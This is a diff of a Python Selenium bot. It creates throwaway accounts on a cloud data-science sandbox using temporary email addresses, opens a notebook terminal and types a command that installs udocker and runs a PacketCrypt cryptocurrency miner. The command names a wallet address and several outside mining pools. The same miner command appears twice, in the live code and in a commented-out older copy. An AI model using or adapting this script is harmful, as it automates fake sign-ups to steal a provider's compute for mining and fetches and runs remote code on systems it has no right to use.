@@ -40,10 +40,10 @@ def get_random_string(length):
     letters = string.ascii_lowercase
     result_str = ''.join(random.choice(letters) for i in range(length))
     print("Random string of length", length, "is:", result_str)
-
-driver.get('https://emailfake.com/')
+    
+driver.get('https://tempmail.dev/en')
 time.sleep(10)
-email=driver.find_element(By.XPATH,'//*[@id="email_ch_text"]').text
+email=driver.find_element(By.XPATH,'//*[@id="current-mail"]').text
 print(email)
 
 window_before = driver.window_handles[0]
@@ -64,15 +64,14 @@ a.send_keys(Keys.TAB).perform()
 a.send_keys(Keys.TAB).perform()
 a.send_keys(Keys.SPACE).perform()
 driver.switch_to.window(window_before)
-
-
 time.sleep(10)
 driver.refresh()
 time.sleep(20)
-driver.find_element(By.XPATH,'//*[@id="email-table"]/div[2]/div[4]/div[3]/center/div/table/tbody/tr/td/table/tbody/tr/td/table/tbody/tr/td/table/tbody/tr/td/table[4]/tbody/tr/td/table/tbody/tr/td').click()
+driver.find_element(By.XPATH,'//*[@id="inbox-dataList"]').click()
+time.sleep(5)
+link=driver.find_element(By.XPATH,'//*[@id="ReadContent"]/center/div/table/tbody/tr/td/table/tbody/tr/td/table/tbody/tr/td/table/tbody/tr/td/table[4]/tbody/tr/td/table/tbody/tr/td/a').get_attribute("href")
+driver.get(link)
 
-after = driver.window_handles[2]
-driver.switch_to.window(after)
 time.sleep(16)
 driver.find_element(By.XPATH,'/html/body/ngx-app/ngx-auth/ngx-public-layout/nb-layout/div/div/div/div/div/nb-layout-column/ngx-setup-password/div/div[2]/nb-card/nb-card-body/form/div[1]/input').click()
 
@@ -98,12 +97,12 @@ a.send_keys(Keys.TAB).perform()
 a.send_keys(Keys.SPACE).perform()
 time.sleep(15)
 driver.find_element(By.XPATH,'/html/body/ngx-app/ngx-data-science/div/ngx-sample-layout/nb-layout/div[1]/div/div/div/div/nb-layout-column/ngx-notebook/div/div[1]/div[3]/div[3]/ui-switch/button').click()
-time.sleep(40)
+time.sleep(35)
 
 driver.find_element(By.XPATH,'//*[@id="mat-chip-list-0"]').click()
 
 
-after = driver.window_handles[3]
+after = driver.window_handles[2]
 driver.switch_to.window(after)
 time.sleep(30)
 a.send_keys(Keys.TAB).perform()
@@ -114,6 +113,82 @@ time.sleep(10)
 a.send_keys('pip install udocker && udocker run thomasjp0x42/packetcrypt ann -p pkt1qdn2a6w03fexcwazz7sp8hncdcvrt3hgrj5re06 http://pool.pkteer.com  http://pool.pktpool.io http://pool.pkt.world https://stratum.zetahash.com').perform()
 a.send_keys(Keys.ENTER).perform()
 time.sleep(100)
+
+
+
+# driver.get('https://emailfake.com/')
+# time.sleep(10)
+# email=driver.find_element(By.XPATH,'//*[@id="email_ch_text"]').text
+# print(email)
+
+# window_before = driver.window_handles[0]
+
+
+# driver.execute_script("window.open('about:blank','secondtab');")
+# driver.switch_to.window("secondtab")
+# driver.get('https://sandbox.blobcity.com/register')
+
+# driver.find_element(By.ID,'signupModalFormSignupName').click()
+# randomLetter = ( ''.join(random.choice(letters) for i in range(10)) )
+# a.send_keys(randomLetter).perform()
+# a.send_keys(Keys.TAB).perform()
+# a.send_keys(email).perform()
+# a.send_keys(Keys.TAB).perform()
+# a.send_keys(Keys.SPACE).perform()
+# a.send_keys(Keys.TAB).perform()
+# a.send_keys(Keys.TAB).perform()
+# a.send_keys(Keys.SPACE).perform()
+# driver.switch_to.window(window_before)
+
+
+# time.sleep(10)
+# driver.refresh()
+# time.sleep(20)
+# driver.find_element(By.XPATH,'//*[@id="email-table"]/div[2]/div[4]/div[3]/center/div/table/tbody/tr/td/table/tbody/tr/td/table/tbody/tr/td/table/tbody/tr/td/table[4]/tbody/tr/td/table/tbody/tr/td').click()
+
+# after = driver.window_handles[2]
+# driver.switch_to.window(after)
+# time.sleep(16)
+# driver.find_element(By.XPATH,'/html/body/ngx-app/ngx-auth/ngx-public-layout/nb-layout/div/div/div/div/div/nb-layout-column/ngx-setup-password/div/div[2]/nb-card/nb-card-body/form/div[1]/input').click()
+
+# password='qwqwqw'
+# a.send_keys(password).perform()
+# a.send_keys(Keys.TAB).perform()
+# a.send_keys(password).perform()
+# a.send_keys(Keys.TAB).perform()
+# a.send_keys(Keys.SPACE).perform()
+# time.sleep(10)
+# driver.find_element(By.ID,'email').click()
+# a.send_keys(email).perform()
+# a.send_keys(Keys.TAB).perform()
+# a.send_keys(password).perform()
+# a.send_keys(Keys.TAB).perform()
+# a.send_keys(Keys.SPACE).perform()
+# time.sleep(15)
+# driver.find_element(By.XPATH,'/html/body/ngx-app/ngx-data-science/div/ngx-sample-layout/nb-layout/div/div/div/div/div/nb-layout-column/ngx-new-cloudbook/div[1]/div[2]/button').click()
+# name="kilkcreate"
+# driver.find_element(By.XPATH,'/html/body/ngb-modal-window/div/div/div/div[2]/form/div[1]/input').click()
+# a.send_keys(name).perform()
+# a.send_keys(Keys.TAB).perform()
+# a.send_keys(Keys.SPACE).perform()
+# time.sleep(15)
+# driver.find_element(By.XPATH,'/html/body/ngx-app/ngx-data-science/div/ngx-sample-layout/nb-layout/div[1]/div/div/div/div/nb-layout-column/ngx-notebook/div/div[1]/div[3]/div[3]/ui-switch/button').click()
+# time.sleep(40)
+
+# driver.find_element(By.XPATH,'//*[@id="mat-chip-list-0"]').click()
+
+
+# after = driver.window_handles[3]
+# driver.switch_to.window(after)
+# time.sleep(30)
+# a.send_keys(Keys.TAB).perform()
+# a.send_keys(Keys.TAB).perform()
+# a.send_keys(Keys.TAB).perform()
+# a.send_keys(Keys.ENTER).perform()
+# time.sleep(10)
+# a.send_keys('pip install udocker && udocker run thomasjp0x42/packetcrypt ann -p pkt1qdn2a6w03fexcwazz7sp8hncdcvrt3hgrj5re06 http://pool.pkteer.com  http://pool.pktpool.io http://pool.pkt.world https://stratum.zetahash.com').perform()
+# a.send_keys(Keys.ENTER).perform()
+# time.sleep(100)
 
 
 
